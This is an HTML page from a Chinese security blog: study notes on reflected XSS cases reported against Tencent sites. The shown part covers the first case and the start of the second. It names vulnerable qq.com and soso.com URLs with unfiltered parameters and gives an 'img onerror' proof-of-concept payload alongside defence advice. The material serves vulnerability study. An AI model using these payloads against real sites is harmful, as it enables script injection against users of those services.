@@ -1,0 +1,1979 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Sec,Web,XSS," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cytosineの有被小窝~" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="@心伤的瘦子 的21个鹅厂XSS案例，从反射型XSS到DOM XSS再到Flash XSS最后到存储型XSS，用案例把各类XSS都讲了一遍，读完之后感觉非常长见识，简单做了一点记录，现在SRC基本不收反射型XSS，Flash应用也几乎绝迹，着重看看存储型XSS叭ヽ(^。^)丿 https://shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;amp;Bu">
+<meta name="keywords" content="Sec,Web,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[XSS笔记]乌云白帽子心伤的瘦子-21个鹅厂XSS案例">
+<meta property="og:url" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/index.html">
+<meta property="og:site_name" content="Cytosineの有被小窝~">
+<meta property="og:description" content="@心伤的瘦子 的21个鹅厂XSS案例，从反射型XSS到DOM XSS再到Flash XSS最后到存储型XSS，用案例把各类XSS都讲了一遍，读完之后感觉非常长见识，简单做了一点记录，现在SRC基本不收反射型XSS，Flash应用也几乎绝迹，着重看看存储型XSS叭ヽ(^。^)丿 https://shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;amp;Bu">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/1-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/2-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/2-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/2-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/3-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/3-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/3-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/3-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/4-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/4-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/4-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/5-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/5-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/5-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/5-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/6-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/6-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/6-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/6-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/6-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/7-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/7-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/7-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/7-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/7-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/7-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/8-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/8-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/8-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/8-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/8-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/8-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/8-6.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-6.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-7.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-8.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/9-9.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/10-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/10-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/10-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/10-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/10-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/10-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/10-6.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/11-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/11-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/11-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/11-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/11-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/12-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/12-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/12-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/12-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/12-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/13-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/13-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/13-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/13-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/13-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/13-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/14-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/14-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/14-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/14-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/14-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/14-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/14-6.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/14-7.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/15-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/15-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/15-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/15-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/15-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/15-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-6.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-7.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/16-8.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/17-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/17-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/17-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/18-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/18-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/18-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/18-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/19-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/19-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/19-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/19-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/19-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/19-5.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/19-6.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/20-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/20-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/20-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/20-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/20-4.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/21-0.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/21-1.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/21-2.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/21-3.webp">
+<meta property="og:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/21-4.webp">
+<meta property="og:updated_time" content="2019-04-09T05:40:48.828Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[XSS笔记]乌云白帽子心伤的瘦子-21个鹅厂XSS案例">
+<meta name="twitter:description" content="@心伤的瘦子 的21个鹅厂XSS案例，从反射型XSS到DOM XSS再到Flash XSS最后到存储型XSS，用案例把各类XSS都讲了一遍，读完之后感觉非常长见识，简单做了一点记录，现在SRC基本不收反射型XSS，Flash应用也几乎绝迹，着重看看存储型XSS叭ヽ(^。^)丿 https://shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;amp;Bu">
+<meta name="twitter:image" content="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/1-0.webp">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/"/>
+
+
+
+
+
+  <title>[XSS笔记]乌云白帽子心伤的瘦子-21个鹅厂XSS案例 | Cytosineの有被小窝~</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cytosineの有被小窝~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">悟已往之不谏，知来者之可追。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            cd ~
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            uname -a
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            ls -al post
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lovegood.github.io/2019/04/08/note-xss-0-xinshangdeshouzi-cases/note-xss-0-xinshangdeshouzi-cases/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cytosine">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.webp">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cytosineの有被小窝~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">[XSS笔记]乌云白帽子心伤的瘦子-21个鹅厂XSS案例</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-08T20:20:58+08:00">
+                2019-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>@心伤的瘦子 的21个鹅厂XSS案例，从反射型XSS到DOM XSS再到Flash XSS最后到存储型XSS，用案例把各类XSS都讲了一遍，读完之后感觉非常长见识，简单做了一点记录，现在SRC基本不收反射型XSS，Flash应用也几乎绝迹，着重看看存储型XSS叭ヽ(^。^)丿</p>
+<p><a href="https://shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;BugSearch%5Btitle%5D=&amp;BugSearch%5Bvendor%5D=&amp;BugSearch%5Bauthor%5D=%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90&amp;BugSearch%5Bbug_type%5D=&amp;BugSearch%5Bbug_level_by_whitehat%5D=&amp;BugSearch%5Bbug_level_by_vendor%5D=&amp;BugSearch%5Brank_by_whitehat%5D=&amp;BugSearch%5Bbug_date%5D=&amp;page=1" target="_blank" rel="external">https://shuimugan.com/bug/index?BugSearch%5Bbug_no%5D=&amp;BugSearch%5Btitle%5D=&amp;BugSearch%5Bvendor%5D=&amp;BugSearch%5Bauthor%5D=%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90&amp;BugSearch%5Bbug_type%5D=&amp;BugSearch%5Bbug_level_by_whitehat%5D=&amp;BugSearch%5Bbug_level_by_vendor%5D=&amp;BugSearch%5Brank_by_whitehat%5D=&amp;BugSearch%5Bbug_date%5D=&amp;page=1</a></p>
+<h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><h2 id="1-什么都没过滤的入门情况"><a href="#1-什么都没过滤的入门情况" class="headerlink" title="1.什么都没过滤的入门情况"></a>1.什么都没过滤的入门情况</h2><p>反射型XSS，无过滤，输出在HTML中，直接插入HTML标签，利用标签的一些事件执行js</p>
+<p>模型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;html标签&gt;输出&lt;/html标签&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<ol>
+<li>XSS的存在，一定是伴随着输入，与输出2个概念的。</li>
+<li>要想过滤掉XSS，你可以在输入层面过滤，也可以在输出层面过滤。</li>
+<li>如果输入和输出都没过滤。 那么漏洞将是显而易见的。</li>
+</ol>
+<p>漏洞url：</p>
+<p><a href="http://app.data.qq.com/?umod=commentsoutlet&amp;act=count&amp;siteid=3&amp;libid=9&amp;dataid=1480&amp;score=1&amp;func=haoping&amp;_=1353475261886" target="_blank" rel="external">http://app.data.qq.com/?umod=commentsoutlet&amp;act=count&amp;siteid=3&amp;libid=9&amp;dataid=1480&amp;score=1&amp;func=haoping&amp;_=1353475261886</a></p>
+<p>漏洞点在score，没有过滤</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.....&amp;score=&lt;img src=1 onerror=alert(1);&gt;&amp;...</div></pre></td></tr></table></figure>
+<p><img src="1-0.webp" alt=""></p>
+<p>防御：<br>通常，我们只需要在输出前，将 &lt; , &gt; 过滤掉即可。<br>这类XSS通常都被浏览器的XSS过滤器秒杀了，所以一般来说，威力较小。</p>
+</blockquote>
+<h2 id="2-输出在-lt-script-gt-lt-script-gt-之间"><a href="#2-输出在-lt-script-gt-lt-script-gt-之间" class="headerlink" title="2.输出在&lt;script&gt;&lt;/script&gt;之间"></a>2.输出在<code>&lt;script&gt;&lt;/script&gt;</code>之间</h2><p>反射型XSS，无过滤，输出在<code>&lt;script&gt;&lt;/script&gt;</code>之间，直接构造js代码，注意把前后的语句闭合。</p>
+<p>模型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;...[输出]...&lt;/script&gt;</div><div class="line">&lt;style&gt;...[输出]...&lt;/script&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>漏洞点</p>
+<p><a href="http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa" target="_blank" rel="external">http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa</a></p>
+<p>callback参数未过滤, 查看源代码：</p>
+<p><img src="2-0.webp" alt=""></p>
